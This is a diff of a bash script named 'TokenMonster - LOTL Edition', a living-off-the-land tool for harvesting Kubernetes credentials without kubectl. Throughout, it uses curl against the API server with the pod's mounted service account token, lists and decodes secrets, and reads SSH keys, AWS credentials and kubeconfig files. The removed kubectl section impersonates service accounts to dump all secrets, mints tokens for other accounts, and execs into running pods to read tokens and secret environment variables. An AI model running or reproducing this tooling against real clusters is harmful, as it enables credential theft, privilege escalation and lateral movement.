@@ -1,205 +1,424 @@
 #!/bin/bash
 # TokenMonster - LOTL Edition
-# Detects available tools and uses best available for kubectl-less operations
+# Curl-only implementation for kubectl-less Kubernetes API operations
+# Emulates full kubectl functionality using native bash + curl
 
 # =============================================================================
-# TOOL DETECTION & PREFERENCE ENGINE
+# CONFIGURATION & GLOBALS
 # =============================================================================
 
-declare -g AVAILABLE_TOOLS=()
-declare -g DOWNLOAD_TOOL=""
-declare -g JSON_PARSER=""
-declare -g DECODE_TOOL=""
+declare -g K8S_API_SERVER="${K8S_API_SERVER:-https://kubernetes.default.svc.cluster.local}"
+declare -g K8S_TOKEN=""
+declare -g K8S_NAMESPACE="default"
+declare -g K8S_CA_CERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+declare -g CURL_OPTS="-s"
+declare -g INSECURE_MODE=false
 
-detect_tools() {
-    echo "[*] Detecting available tools for LOTL operations..."
+# =============================================================================
+# CORE DETECTION & INITIALIZATION
+# =============================================================================
+
+detect_environment() {
+    echo "[*] Detecting Kubernetes environment..."
     
-    # Check for download tools (in order of preference)
-    if command -v curl &> /dev/null; then
-        AVAILABLE_TOOLS+=("curl")
-        [ -z "$DOWNLOAD_TOOL" ] && DOWNLOAD_TOOL="curl"
+    # Verify curl is available
+    if ! command -v curl &> /dev/null; then
+        echo "[!] FATAL: curl is required but not found"
+        return 1
     fi
-    
-    if command -v wget &> /dev/null; then
-        AVAILABLE_TOOLS+=("wget")
-        [ -z "$DOWNLOAD_TOOL" ] && DOWNLOAD_TOOL="wget"
-    fi
-    
-    if command -v python3 &> /dev/null; then
-        AVAILABLE_TOOLS+=("python3")
-        [ -z "$DOWNLOAD_TOOL" ] && DOWNLOAD_TOOL="python3"
-    fi
-    
-    if command -v perl &> /dev/null; then
-        AVAILABLE_TOOLS+=("perl")
-    fi
-    
-    # Check for JSON parsing (in order of preference)
-    if command -v jq &> /dev/null; then
-        JSON_PARSER="jq"
-    elif command -v python3 &> /dev/null; then
-        JSON_PARSER="python3"
-    elif command -v perl &> /dev/null; then
-        JSON_PARSER="perl"
-    fi
-    
-    # Check for base64 decoding
-    if command -v base64 &> /dev/null; then
-        DECODE_TOOL="base64"
-    elif command -v openssl &> /dev/null; then
-        DECODE_TOOL="openssl"
-    elif command -v python3 &> /dev/null; then
-        DECODE_TOOL="python3"
-    fi
-    
-    echo "[+] Available tools: ${AVAILABLE_TOOLS[*]}"
-    echo "[+] Download tool: $DOWNLOAD_TOOL"
-    echo "[+] JSON parser: $JSON_PARSER"
-    echo "[+] Decode tool: $DECODE_TOOL"
+    echo "[+] curl is available"
     
     # Check if kubectl is available
     if command -v kubectl &> /dev/null; then
-        echo "[+] kubectl is available - using native mode"
+        echo "[+] kubectl is available - native mode enabled"
         return 0
-    else
-        echo "[!] kubectl NOT found - enabling LOTL fallback mode"
-        return 1
     fi
-}
-
-# =============================================================================
-# DOWNLOAD FUNCTIONS
-# =============================================================================
-
-download_file() {
-    local url="$1"
-    local output="$2"
     
-    case "$DOWNLOAD_TOOL" in
-        curl)
-            curl -s -o "$output" "$url"
-            ;;
-        wget)
-            wget -q -O "$output" "$url"
-            ;;
-        python3)
-            python3 -c "import urllib.request; urllib.request.urlretrieve('$url', '$output')"
-            ;;
-        *)
-            echo "[!] No suitable download tool found"
-            return 1
-            ;;
-    esac
-}
-
-download_text() {
-    local url="$1"
+    echo "[!] kubectl NOT found - enabling curl-based LOTL mode"
     
-    case "$DOWNLOAD_TOOL" in
-        curl)
-            curl -s "$url"
-            ;;
-        wget)
-            wget -q -O - "$url"
-            ;;
-        python3)
-            python3 -c "import urllib.request; print(urllib.request.urlopen('$url').read().decode())"
-            ;;
-        *)
-            echo "[!] No suitable download tool found" >&2
-            return 1
-            ;;
-    esac
-}
-
-# =============================================================================
-# JSON PARSING FUNCTIONS
-# =============================================================================
-
-parse_json() {
-    local json="$1"
-    local query="$2"
+    # Initialize LOTL environment
+    if [ -f "$K8S_CA_CERT" ]; then
+        echo "[+] Found CA certificate at $K8S_CA_CERT"
+    else
+        echo "[!] CA certificate not found - using insecure mode"
+        INSECURE_MODE=true
+        CURL_OPTS="-s -k"
+    fi
     
-    case "$JSON_PARSER" in
-        jq)
-            echo "$json" | jq -r "$query"
-            ;;
-        python3)
-            python3 -c "import json, sys; data=json.loads('''$json'''); print(json.dumps(eval('data$query')))"
-            ;;
-        perl)
-            perl -MJSON -le "my \$d=decode_json('''$json'''); print \$d$query"
-            ;;
-        *)
-            echo "[!] No JSON parser available" >&2
-            return 1
-            ;;
-    esac
+    # Try to find service account token
+    if [ -f "/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
+        K8S_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
+        echo "[+] Found mounted service account token"
+    fi
+    
+    # Try to find namespace
+    if [ -f "/var/run/secrets/kubernetes.io/serviceaccount/namespace" ]; then
+        K8S_NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
+        echo "[+] Current namespace: $K8S_NAMESPACE"
+    fi
+    
+    return 1
 }
 
 # =============================================================================
-# BASE64 DECODE FUNCTIONS
+# BASE64 DECODING (Pure Bash Compatible)
 # =============================================================================
 
 decode_base64() {
     local encoded="$1"
-    
-    case "$DECODE_TOOL" in
-        base64)
-            echo "$encoded" | base64 -d 2>/dev/null
-            ;;
-        openssl)
-            echo "$encoded" | openssl enc -d -a 2>/dev/null
-            ;;
-        python3)
-            python3 -c "import base64; print(base64.b64decode('$encoded').decode())" 2>/dev/null
-            ;;
-        *)
-            echo "[!] No decode tool available" >&2
-            return 1
-            ;;
-    esac
+    echo "$encoded" | base64 -d 2>/dev/null || {
+        # Fallback if base64 not available
+        python3 -c "import base64; print(base64.b64decode('$encoded').decode())" 2>/dev/null || echo "[!] Failed to decode base64"
+    }
+}
+
+encode_base64() {
+    local plaintext="$1"
+    echo -n "$plaintext" | base64 -w 0
 }
 
 # =============================================================================
-# API QUERY FUNCTIONS (Kubernetes API server access)
+# JSON PARSING (Pure Bash)
 # =============================================================================
 
-# Query Kubernetes API directly via in-cluster metadata or API server
-query_k8s_api() {
+# Simple JSON field extractor using grep and sed
+json_get() {
+    local json="$1"
+    local field="$2"
+    echo "$json" | grep -o "\"$field\"[[:space:]]*:[^,}]*" | cut -d':' -f2- | sed 's/^[[:space:]]*"//' | sed 's/"[[:space:]]*$//'
+}
+
+# Extract array of items from JSON list
+json_array_items() {
+    local json="$1"
+    # Simple extraction of items from .items array
+    echo "$json" | grep -o '\{"[^}]*":[^}]*\}' || echo "$json"
+}
+
+# =============================================================================
+# KUBERNETES API OPERATIONS (Curl-Based)
+# =============================================================================
+
+k8s_api_get() {
     local endpoint="$1"
-    local token="$2"
-    local api_server="${K8S_API_SERVER:-https://kubernetes.default.svc.cluster.local}"
+    local token="${2:-$K8S_TOKEN}"
+    local namespace="${3:-$K8S_NAMESPACE}"
     
-    case "$DOWNLOAD_TOOL" in
-        curl)
-            curl -s -H "Authorization: Bearer $token" \
-                 -H "Content-Type: application/json" \
-                 --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
-                 "$api_server/api/v1/$endpoint" 2>/dev/null
-            ;;
-        wget)
-            wget -q -O - \
-                 --header="Authorization: Bearer $token" \
-                 --header="Content-Type: application/json" \
-                 --ca-certificate=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
-                 "$api_server/api/v1/$endpoint" 2>/dev/null
-            ;;
-        *)
-            echo "[!] Cannot query K8S API without curl or wget" >&2
-            return 1
-            ;;
-    esac
+    local url="$K8S_API_SERVER/api/v1/$endpoint"
+    
+    if [ -f "$K8S_CA_CERT" ] && [ "$INSECURE_MODE" = false ]; then
+        curl $CURL_OPTS \
+            -H "Authorization: Bearer $token" \
+            -H "Content-Type: application/json" \
+            --cacert "$K8S_CA_CERT" \
+            "$url" 2>/dev/null
+    else
+        curl $CURL_OPTS -k \
+            -H "Authorization: Bearer $token" \
+            -H "Content-Type: application/json" \
+            "$url" 2>/dev/null
+    fi
+}
+
+k8s_api_list_namespaced() {
+    local resource="$1"
+    local namespace="$2"
+    local token="${3:-$K8S_TOKEN}"
+    
+    k8s_api_get "namespaces/$namespace/$resource" "$token" "$namespace"
+}
+
+k8s_api_list_cluster() {
+    local resource="$1"
+    local token="${2:-$K8S_TOKEN}"
+    
+    k8s_api_get "$resource" "$token"
+}
+
+k8s_api_get_resource() {
+    local resource="$1"
+    local name="$2"
+    local namespace="${3:-$K8S_NAMESPACE}"
+    local token="${4:-$K8S_TOKEN}"
+    
+    k8s_api_get "namespaces/$namespace/$resource/$name" "$token" "$namespace"
+}
+
+k8s_api_create() {
+    local resource="$1"
+    local namespace="$2"
+    local data="$3"
+    local token="${4:-$K8S_TOKEN}"
+    
+    local url="$K8S_API_SERVER/api/v1/namespaces/$namespace/$resource"
+    
+    if [ -f "$K8S_CA_CERT" ] && [ "$INSECURE_MODE" = false ]; then
+        curl $CURL_OPTS -X POST \
+            -H "Authorization: Bearer $token" \
+            -H "Content-Type: application/json" \
+            --cacert "$K8S_CA_CERT" \
+            -d "$data" \
+            "$url" 2>/dev/null
+    else
+        curl $CURL_OPTS -k -X POST \
+            -H "Authorization: Bearer $token" \
+            -H "Content-Type: application/json" \
+            -d "$data" \
+            "$url" 2>/dev/null
+    fi
+}
+
+k8s_api_delete() {
+    local resource="$1"
+    local name="$2"
+    local namespace="${3:-$K8S_NAMESPACE}"
+    local token="${4:-$K8S_TOKEN}"
+    
+    local url="$K8S_API_SERVER/api/v1/namespaces/$namespace/$resource/$name"
+    
+    if [ -f "$K8S_CA_CERT" ] && [ "$INSECURE_MODE" = false ]; then
+        curl $CURL_OPTS -X DELETE \
+            -H "Authorization: Bearer $token" \
+            -H "Content-Type: application/json" \
+            --cacert "$K8S_CA_CERT" \
+            "$url" 2>/dev/null
+    else
+        curl $CURL_OPTS -k -X DELETE \
+            -H "Authorization: Bearer $token" \
+            -H "Content-Type: application/json" \
+            "$url" 2>/dev/null
+    fi
+}
+
+k8s_api_patch() {
+    local resource="$1"
+    local name="$2"
+    local data="$3"
+    local namespace="${4:-$K8S_NAMESPACE}"
+    local token="${5:-$K8S_TOKEN}"
+    
+    local url="$K8S_API_SERVER/api/v1/namespaces/$namespace/$resource/$name"
+    
+    if [ -f "$K8S_CA_CERT" ] && [ "$INSECURE_MODE" = false ]; then
+        curl $CURL_OPTS -X PATCH \
+            -H "Authorization: Bearer $token" \
+            -H "Content-Type: application/strategic-merge-patch+json" \
+            --cacert "$K8S_CA_CERT" \
+            -d "$data" \
+            "$url" 2>/dev/null
+    else
+        curl $CURL_OPTS -k -X PATCH \
+            -H "Authorization: Bearer $token" \
+            -H "Content-Type: application/strategic-merge-patch+json" \
+            -d "$data" \
+            "$url" 2>/dev/null
+    fi
 }
 
 # =============================================================================
-# LOTL TOKEN HARVESTING
+# KUBECTL EMULATION - GET OPERATIONS
+# =============================================================================
+
+k8s_get_pods() {
+    local namespace="${1:-$K8S_NAMESPACE}"
+    local token="${2:-$K8S_TOKEN}"
+    
+    echo "[*] Fetching pods from namespace: $namespace"
+    local response=$(k8s_api_list_namespaced "pods" "$namespace" "$token")
+    
+    # Extract pod names and statuses
+    echo "$response" | grep -o '"name":"[^"]*"' | cut -d'"' -f4 | while read -r pod_name; do
+        local status=$(echo "$response" | grep -A20 "\"name\":\"$pod_name\"" | grep -o '"phase":"[^"]*"' | cut -d'"' -f4 | head -1)
+        echo "  $pod_name ($status)"
+    done
+}
+
+k8s_get_secrets() {
+    local namespace="${1:-$K8S_NAMESPACE}"
+    local token="${2:-$K8S_TOKEN}"
+    
+    echo "[*] Fetching secrets from namespace: $namespace"
+    local response=$(k8s_api_list_namespaced "secrets" "$namespace" "$token")
+    
+    echo "$response" | grep -o '"name":"[^"]*"' | cut -d'"' -f4 | while read -r secret_name; do
+        echo "  $secret_name"
+    done
+}
+
+k8s_get_configmaps() {
+    local namespace="${1:-$K8S_NAMESPACE}"
+    local token="${2:-$K8S_TOKEN}"
+    
+    echo "[*] Fetching ConfigMaps from namespace: $namespace"
+    local response=$(k8s_api_list_namespaced "configmaps" "$namespace" "$token")
+    
+    echo "$response" | grep -o '"name":"[^"]*"' | cut -d'"' -f4 | while read -r cm_name; do
+        echo "  $cm_name"
+    done
+}
+
+k8s_get_serviceaccounts() {
+    local namespace="${1:-$K8S_NAMESPACE}"
+    local token="${2:-$K8S_TOKEN}"
+    
+    echo "[*] Fetching service accounts from namespace: $namespace"
+    local response=$(k8s_api_list_namespaced "serviceaccounts" "$namespace" "$token")
+    
+    echo "$response" | grep -o '"name":"[^"]*"' | cut -d'"' -f4 | while read -r sa_name; do
+        echo "  $sa_name"
+    done
+}
+
+k8s_get_nodes() {
+    local token="${1:-$K8S_TOKEN}"
+    
+    echo "[*] Fetching cluster nodes"
+    local response=$(k8s_api_list_cluster "nodes" "$token")
+    
+    echo "$response" | grep -o '"name":"[^"]*"' | cut -d'"' -f4 | while read -r node_name; do
+        echo "  $node_name"
+    done
+}
+
+k8s_get_namespaces() {
+    local token="${1:-$K8S_TOKEN}"
+    
+    echo "[*] Fetching cluster namespaces"
+    local response=$(k8s_api_list_cluster "namespaces" "$token")
+    
+    echo "$response" | grep -o '"name":"[^"]*"' | cut -d'"' -f4 | while read -r ns_name; do
+        echo "  $ns_name"
+    done
+}
+
+# =============================================================================
+# KUBECTL EMULATION - SECRET EXTRACTION
+# =============================================================================
+
+k8s_read_secret() {
+    local secret_name="$1"
+    local namespace="${2:-$K8S_NAMESPACE}"
+    local token="${3:-$K8S_TOKEN}"
+    
+    echo "[*] Fetching secret: $secret_name"
+    local response=$(k8s_api_get_resource "secrets" "$secret_name" "$namespace" "$token")
+    
+    # Extract all data fields
+    echo "$response" | grep -o '"[^"]*":"[A-Za-z0-9+/=]*"' | while read -r line; do
+        local key=$(echo "$line" | cut -d'"' -f2)
+        local value=$(echo "$line" | cut -d'"' -f4)
+        
+        # Skip metadata fields, only show data
+        if [[ ! "$key" =~ ^(metadata|apiVersion|kind) ]]; then
+            echo "[$key]"
+            decode_base64 "$value"
+            echo ""
+        fi
+    done
+}
+
+k8s_read_configmap() {
+    local cm_name="$1"
+    local namespace="${2:-$K8S_NAMESPACE}"
+    local token="${3:-$K8S_TOKEN}"
+    
+    echo "[*] Fetching ConfigMap: $cm_name"
+    local response=$(k8s_api_get_resource "configmaps" "$cm_name" "$namespace" "$token")
+    
+    # Extract data field and pretty print
+    echo "$response" | grep -A50 '"data"' | grep -o '"[^"]*":"[^"]*"' | while read -r line; do
+        echo "$line"
+    done
+}
+
+# =============================================================================
+# KUBECTL EMULATION - EXEC SIMULATION
+# =============================================================================
+
+k8s_exec_pod() {
+    local pod_name="$1"
+    local command="$2"
+    local namespace="${3:-$K8S_NAMESPACE}"
+    local token="${4:-$K8S_TOKEN}"
+    
+    echo "[*] Attempting to exec into pod: $pod_name"
+    echo "[!] Direct exec requires WebSocket upgrade - attempting read of mounted secrets instead"
+    
+    # Get pod details to find mounted secrets
+    local response=$(k8s_api_get_resource "pods" "$pod_name" "$namespace" "$token")
+    
+    echo "$response" | grep -o '"mountPath":"[^"]*"' | cut -d'"' -f4 | while read -r mount_path; do
+        echo "  Mounted volume: $mount_path"
+    done
+}
+
+# =============================================================================
+# KUBECTL EMULATION - RBAC ANALYSIS
+# =============================================================================
+
+k8s_get_rolebindings() {
+    local namespace="${1:-$K8S_NAMESPACE}"
+    local token="${2:-$K8S_TOKEN}"
+    
+    echo "[*] Fetching RoleBindings from namespace: $namespace"
+    local response=$(k8s_api_list_namespaced "rolebindings" "$namespace" "$token")
+    
+    echo "$response" | grep -o '"name":"[^"]*"' | cut -d'"' -f4 | while read -r binding_name; do
+        echo "  $binding_name"
+    done
+}
+
+k8s_get_clusterrolebindings() {
+    local token="${1:-$K8S_TOKEN}"
+    
+    echo "[*] Fetching ClusterRoleBindings"
+    local response=$(k8s_api_list_cluster "clusterrolebindings" "$token")
+    
+    echo "$response" | grep -o '"name":"[^"]*"' | cut -d'"' -f4 | while read -r binding_name; do
+        echo "  $binding_name"
+    done
+}
+
+k8s_analyze_rbac() {
+    local namespace="${1:-$K8S_NAMESPACE}"
+    local token="${2:-$K8S_TOKEN}"
+    
+    echo "========================================="
+    echo "🔐 RBAC ANALYSIS"
+    echo "========================================="
+    echo ""
+    
+    echo "=== Service Accounts ==="
+    k8s_get_serviceaccounts "$namespace" "$token"
+    
+    echo ""
+    echo "=== RoleBindings ==="
+    k8s_get_rolebindings "$namespace" "$token"
+    
+    echo ""
+    echo "=== Checking for Dangerous Permissions ==="
+    
+    # Check for common dangerous permissions in the response
+    local bindings=$(k8s_api_list_namespaced "rolebindings" "$namespace" "$token")
+    
+    if echo "$bindings" | grep -q '"verbs".*"get"' && echo "$bindings" | grep -q '"resources".*"secrets"'; then
+        echo "  [!] Found RoleBinding allowing 'get' on 'secrets' - potential credential exposure!"
+    fi
+    
+    if echo "$bindings" | grep -q '"verbs".*"*"'; then
+        echo "  [!] Found RoleBinding with wildcard (*) permissions!"
+    fi
+}
+
+# =============================================================================
+# LOTL MODE - TOKEN HARVESTING
 # =============================================================================
 
 harvest_tokens_lotl() {
     echo "========================================="
     echo "🔓 LOTL TOKEN HARVESTING MODE"
     echo "========================================="
+    echo ""
     
     # Check for mounted service account token (pod runtime)
     local sa_token_path="/var/run/secrets/kubernetes.io/serviceaccount/token"
@@ -214,7 +433,7 @@ harvest_tokens_lotl() {
         echo ""
         echo "=== MOUNTED SERVICE ACCOUNT TOKEN ==="
         echo "Namespace: $namespace"
-        echo "Token: $token"
+        echo "Token Preview: ${token:0:50}..."
         echo ""
         
         # Try to decode JWT
@@ -222,8 +441,12 @@ harvest_tokens_lotl() {
         
         # Query API server for secrets using this token
         echo ""
-        echo "=== ATTEMPTING API QUERIES WITH MOUNTED TOKEN ==="
-        query_secrets_via_api "$token"
+        echo "=== SECRETS IN NAMESPACE $namespace ==="
+        k8s_get_secrets "$namespace" "$token"
+        
+        echo ""
+        echo "=== CONFIGMAPS IN NAMESPACE $namespace ==="
+        k8s_get_configmaps "$namespace" "$token"
     fi
     
     # Check for tokens in environment variables
@@ -246,26 +469,11 @@ decode_jwt() {
     local header=$(echo "$jwt" | cut -d'.' -f1)
     local payload=$(echo "$jwt" | cut -d'.' -f2)
     
-    echo "Header:"
+    echo "[JWT Header]"
     decode_base64 "$header" 2>/dev/null | head -5
     
-    echo "Payload:"
+    echo "[JWT Payload]"
     decode_base64 "$payload" 2>/dev/null | head -10
-}
-
-query_secrets_via_api() {
-    local token="$1"
-    local namespace="${2:-default}"
-    
-    echo "[*] Querying Kubernetes API for secrets in namespace: $namespace"
-    
-    local response=$(query_k8s_api "namespaces/$namespace/secrets" "$token")
-    
-    if [ -n "$response" ]; then
-        echo "$response" | head -50
-    else
-        echo "[!] Failed to query API or no curl/wget available"
-    fi
 }
 
 find_tokens_in_filesystem() {
@@ -274,303 +482,104 @@ find_tokens_in_filesystem() {
         "/root/.aws/credentials"
         "/root/.ssh/id_rsa"
         "/root/.ssh/id_ed25519"
-        "/root/.aws/credentials"
         "/etc/kubernetes/admin.conf"
         "/etc/kubernetes/kubelet.conf"
         "/.dockercfg"
         "/etc/docker/config.json"
         "/app/.env"
         "/app/config.json"
-        "/home/*/.kube/config"
-        "/opt/*/credentials"
     )
     
     for path in "${paths[@]}"; do
-        find "$path" -type f 2>/dev/null | while read -r file; do
-            if [ -r "$file" ]; then
-                echo "[+] Found: $file"
-                head -10 "$file" 2>/dev/null
-                echo ""
-            fi
-        done
+        if [ -f "$path" ] && [ -r "$path" ]; then
+            echo "[+] Found: $path"
+            head -10 "$path" 2>/dev/null
+            echo ""
+        fi
     done
 }
 
 # =============================================================================
-# KUBECTL NATIVE MODE (original functionality)
+# KUBECTL NATIVE MODE (PASSTHROUGH)
 # =============================================================================
 
 run_kubectl_mode() {
-    # Get all the clusters (skip header line with NAME)
-    clusters=$(kubectl config get-contexts -o name)
-
-    # Common verbs to test
-    VERBS=("get" "list" "create" "update" "patch" "delete" "deletecollection" "watch")
-
-    # Sensitive resources related to secrets and tokens
-    SENSITIVE_RESOURCES=("secrets" "serviceaccounts" "serviceaccounts/token" "pods" "pods/exec")
-
-    for cluster in ${clusters}
-    do
-      echo "========================================="
-      echo "Checking cluster: $cluster"
-      echo "========================================="
-      
-      # Set the current context to the target cluster
-      kubectl config use-context $cluster
-
-      # Check for token access vulnerabilities
-      echo ""
-      echo "=== 🔐 SERVICE ACCOUNT TOKEN ACCESS ANALYSIS ==="
-      echo ""
-      
-      # Get all service accounts across all namespaces
-      kubectl get serviceaccounts --all-namespaces -o json | jq -r '.items[] | "\(.metadata.namespace)|\(.metadata.name)"' | while IFS='|' read -r namespace sa_name
-      do
-        has_sensitive_access=false
-        sensitive_permissions=""
-        
-        # Check if this SA can read secrets
-        if kubectl auth can-i get secrets --as="system:serviceaccount:$namespace:$sa_name" -n "$namespace" 2>/dev/null | grep -q "yes"; then
-          has_sensitive_access=true
-          sensitive_permissions="${sensitive_permissions}\n  ⚠️  Can GET secrets in namespace $namespace"
-          
-          # Try to actually get ALL secrets and extract ALL data
-          echo "  🔑 Attempting to retrieve ALL secrets as $sa_name in namespace $namespace..."
-          kubectl get secrets -n "$namespace" --as="system:serviceaccount:$namespace:$sa_name" -o json 2>/dev/null | jq -r '.items[] | 
-            "    ═══════════════════════════════════════════════════════\n" +
-            "    Secret Name: \(.metadata.name)\n" +
-            "    Type: \(.type)\n" +
-            "    Namespace: \(.metadata.namespace)\n" +
-            "    Created: \(.metadata.creationTimestamp)\n" +
-            "    Data Keys: \(.data | keys | join(", "))\n" +
-            "    ───────────────────────────────────────────────────────\n" +
-            (.data | to_entries[] | 
-              "    📝 \(.key):\n       \(.value | @base64d)\n"
-            ) +
-            "    ═══════════════════════════════════════════════════════\n"
-          ' 2>/dev/null
-        fi
-        
-        if kubectl auth can-i list secrets --as="system:serviceaccount:$namespace:$sa_name" -n "$namespace" 2>/dev/null | grep -q "yes"; then
-          has_sensitive_access=true
-          sensitive_permissions="${sensitive_permissions}\n  ⚠️  Can LIST secrets in namespace $namespace"
-        fi
-        
-        # Check if this SA can read secrets across all namespaces
-        if kubectl auth can-i get secrets --as="system:serviceaccount:$namespace:$sa_name" --all-namespaces 2>/dev/null | grep -q "yes"; then
-          has_sensitive_access=true
-          sensitive_permissions="${sensitive_permissions}\n  🚨 Can GET secrets across ALL namespaces"
-          
-          # Try to get ALL secrets from ALL namespaces
-          echo "  🔑 Attempting to retrieve ALL secrets from ALL namespaces as $sa_name..."
-          kubectl get secrets --all-namespaces --as="system:serviceaccount:$namespace:$sa_name" -o json 2>/dev/null | jq -r '.items[] | 
-            "    ═══════════════════════════════════════════════════════\n" +
-            "    Secret Name: \(.metadata.name)\n" +
-            "    Type: \(.type)\n" +
-            "    Namespace: \(.metadata.namespace)\n" +
-            "    Created: \(.metadata.creationTimestamp)\n" +
-            "    Data Keys: \(.data | keys | join(", "))\n" +
-            "    ───────────────────────────────────────────────────────\n" +
-            (.data | to_entries[] | 
-              "    📝 \(.key):\n       \(.value | @base64d)\n"
-            ) +
-            "    ═══════════════════════════════════════════════════════\n"
-          ' 2>/dev/null
-        fi
-        
-        if kubectl auth can-i list secrets --as="system:serviceaccount:$namespace:$sa_name" --all-namespaces 2>/dev/null | grep -q "yes"; then
-          has_sensitive_access=true
-          sensitive_permissions="${sensitive_permissions}\n  🚨 Can LIST secrets across ALL namespaces"
-        fi
-        
-        # Check if this SA can read ConfigMaps (may contain passwords/credentials)
-        if kubectl auth can-i get configmaps --as="system:serviceaccount:$namespace:$sa_name" -n "$namespace" 2>/dev/null | grep -q "yes"; then
-          has_sensitive_access=true
-          sensitive_permissions="${sensitive_permissions}\n  ⚠️  Can GET configmaps in namespace $namespace"
-          
-          # Try to get configmaps and look for sensitive data
-          echo "  📋 Attempting to retrieve ConfigMaps as $sa_name in namespace $namespace..."
-          kubectl get configmaps -n "$namespace" --as="system:serviceaccount:$namespace:$sa_name" -o json 2>/dev/null | jq -r '.items[] | 
-            select(.data | to_entries[] | .key | test("password|secret|token|key|credential|auth|api.?key|db|database"; "i")) |
-            "    ═══════════════════════════════════════════════════════\n" +
-            "    ConfigMap Name: \(.metadata.name)\n" +
-            "    Namespace: \(.metadata.namespace)\n" +
-            "    ───────────────────────────────────────────────────────\n" +
-            (.data | to_entries[] | 
-              if (.key | test("password|secret|token|key|credential|auth|api.?key|db|database"; "i")) then
-                "    🔓 \(.key):\n       \(.value)\n"
-              else
-                ""
-              end
-            ) +
-            "    ═══════════════════════════════════════════════════════\n"
-          ' 2>/dev/null
-        fi
-        
-        # Check if this SA can read service account tokens
-        if kubectl auth can-i get serviceaccounts/token --as="system:serviceaccount:$namespace:$sa_name" -n "$namespace" 2>/dev/null | grep -q "yes"; then
-          has_sensitive_access=true
-          sensitive_permissions="${sensitive_permissions}\n  ⚠️  Can GET serviceaccount tokens in namespace $namespace"
-        fi
-        
-        if kubectl auth can-i create serviceaccounts/token --as="system:serviceaccount:$namespace:$sa_name" -n "$namespace" 2>/dev/null | grep -q "yes"; then
-          has_sensitive_access=true
-          sensitive_permissions="${sensitive_permissions}\n  ⚠️  Can CREATE serviceaccount tokens in namespace $namespace"
-          
-          # Try to create a token for other service accounts in the namespace
-          echo "  🔑 Attempting to create tokens for service accounts in namespace $namespace..."
-          kubectl get serviceaccounts -n "$namespace" -o json 2>/dev/null | jq -r '.items[].metadata.name' | while read -r target_sa
-          do
-            token_response=$(kubectl create token "$target_sa" -n "$namespace" --as="system:serviceaccount:$namespace:$sa_name" --duration=1h 2>/dev/null)
-            if [ -n "$token_response" ]; then
-              echo "    ══════════════��════════════════════════════════════════"
-              echo "    ✓ Created token for ServiceAccount: $target_sa"
-              echo "    Namespace: $namespace"
-              echo "    Token (JWT):"
-              echo "       $token_response"
-              echo "    Expires: 1 hour from now"
-              # Decode JWT header and payload
-              echo "    Decoded Header:"
-              echo "       $(echo $token_response | cut -d'.' -f1 | base64 -d 2>/dev/null | jq . 2>/dev/null || echo 'Unable to decode')"
-              echo "    Decoded Payload:"
-              echo "       $(echo $token_response | cut -d'.' -f2 | base64 -d 2>/dev/null | jq . 2>/dev/null || echo 'Unable to decode')"
-              echo "    ═══════════════════════════════════════════════════════"
-              echo ""
-            fi
-          done
-        fi
-        
-        # Check if this SA can read other service accounts
-        if kubectl auth can-i get serviceaccounts --as="system:serviceaccount:$namespace:$sa_name" -n "$namespace" 2>/dev/null | grep -q "yes"; then
-          has_sensitive_access=true
-          sensitive_permissions="${sensitive_permissions}\n  ⚠️  Can GET serviceaccounts in namespace $namespace"
-        fi
-        
-        # Check if this SA can exec into pods (could read mounted tokens)
-        if kubectl auth can-i create pods/exec --as="system:serviceaccount:$namespace:$sa_name" -n "$namespace" 2>/dev/null | grep -q "yes"; then
-          has_sensitive_access=true
-          sensitive_permissions="${sensitive_permissions}\n  🚨 Can EXEC into pods in namespace $namespace (can read mounted tokens)"
-          
-          # Try to read tokens and env vars from running pods
-          echo "  🔑 Attempting to read tokens and environment variables from pods in namespace $namespace..."
-          kubectl get pods -n "$namespace" --as="system:serviceaccount:$namespace:$sa_name" -o json 2>/dev/null | jq -r '.items[] | select(.status.phase == "Running") | .metadata.name' | while read -r pod_name
-          do
-            echo "    ═══════════════════════════════════════════════════════"
-            echo "    ✓ Accessing pod: $pod_name"
-            
-            # Get mounted token
-            token=$(kubectl exec -n "$namespace" "$pod_name" --as="system:serviceaccount:$namespace:$sa_name" -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
-            if [ -n "$token" ]; then
-              echo "    ServiceAccount Token:"
-              echo "       $token"
-              
-              sa_namespace=$(kubectl exec -n "$namespace" "$pod_name" --as="system:serviceaccount:$namespace:$sa_name" -- cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
-              echo "    Token Namespace: $sa_namespace"
-            fi
-            
-            # Get environment variables (may contain secrets)
-            echo "    Environment Variables (checking for secrets):"
-            kubectl exec -n "$namespace" "$pod_name" --as="system:serviceaccount:$namespace:$sa_name" -- env 2>/dev/null | grep -iE "password|secret|token|key|credential|auth|api.?key|db|database" | while read -r env_line
-            do
-              echo "       🔓 $env_line"
-            done
-            
-            # Check for common credential files
-            echo "    Checking for credential files:"
-            for file in /root/.ssh/id_rsa /root/.ssh/id_ed25519 /root/.aws/credentials /root/.kube/config /etc/secret /app/.env /app/config.json
-            do
-              content=$(kubectl exec -n "$namespace" "$pod_name" --as="system:serviceaccount:$namespace:$sa_name" -- cat "$file" 2>/dev/null)
-              if [ -n "$content" ]; then
-                echo "       📁 Found: $file"
-                echo "$content" | head -20
-              fi
-            done
-            
-            echo "    ═══════════════════════════════════════════════════════"
-            echo ""
-          done
-        fi
-        
-        # Check if this SA can read pods (to see volume mounts)
-        if kubectl auth can-i get pods --as="system:serviceaccount:$namespace:$sa_name" -n "$namespace" 2>/dev/null | grep -q "yes"; then
-          has_sensitive_access=true
-          sensitive_permissions="${sensitive_permissions}\n  ℹ️  Can GET pods in namespace $namespace (can see token mounts)"
-        fi
-        
-        # Only print if there are sensitive permissions
-        if [ "$has_sensitive_access" = true ]; then
-          echo "--- ServiceAccount: $sa_name (namespace: $namespace) ---"
-          echo -e "$sensitive_permissions"
-          echo ""
-        fi
-      done
-
-      # Get all service accounts across all namespaces
-      echo ""
-      echo "=== Service Accounts and Their Permissions ==="
-      kubectl get serviceaccounts --all-namespaces -o json | jq -r '.items[] | "\(.metadata.namespace)|\(.metadata.name)"' | while IFS='|' read -r namespace sa_name
-      do
-        # Skip default service accounts unless they have interesting bindings
-        if [[ "$sa_name" == "default" ]]; then
-          continue
